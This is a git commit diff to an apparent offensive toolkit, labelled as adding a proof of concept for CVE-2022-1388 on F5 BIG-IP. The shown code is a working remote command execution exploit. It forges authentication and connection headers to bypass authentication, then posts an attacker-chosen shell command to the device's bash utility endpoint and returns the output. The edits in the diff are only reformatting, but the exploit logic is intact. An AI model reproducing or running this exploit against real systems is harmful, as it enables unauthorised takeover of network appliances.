ce50236189852cba84071c5d37d67fbabdbf01ac
signorrayan <signor.rayan@gmail.com>
2022-05-10 03:16:27 +0430

    Add CVE-2022-1388 - F5 BIG-IP PoC

--- toolkit/scripts/webapp/cve_2022_1388.py
+++ toolkit/scripts/webapp/cve_2022_1388.py
@@ -11,15 +11,18 @@ def exploit(target, command):
         'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
         'X-F5-Auth-Token': 'asdf',
         'Connection': 'X-F5-Auth-Token',
-        'Content-Type': 'application/json'
-
+        'Content-Type': 'application/json',
     }
     j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(command)}
     response = requests.post(url, headers=headers, json=j, verify=False)
     response.raise_for_status()  # raises exception when not a 2xx response
-    if (response.status_code != 204 and response.headers["content-type"].strip().startswith("application/json")):
+    if response.status_code != 204 and response.headers[
+        "content-type"
+    ].strip().startswith("application/json"):
         result = {"message": response.json()['commandResult'].strip()}
     else:
-        result = {"message": "Response is empty! Target does not seems to be vulnerable.."}
+        result = {
+            "message": "Response is empty! Target does not seems to be vulnerable.."
+        }
 
     return result
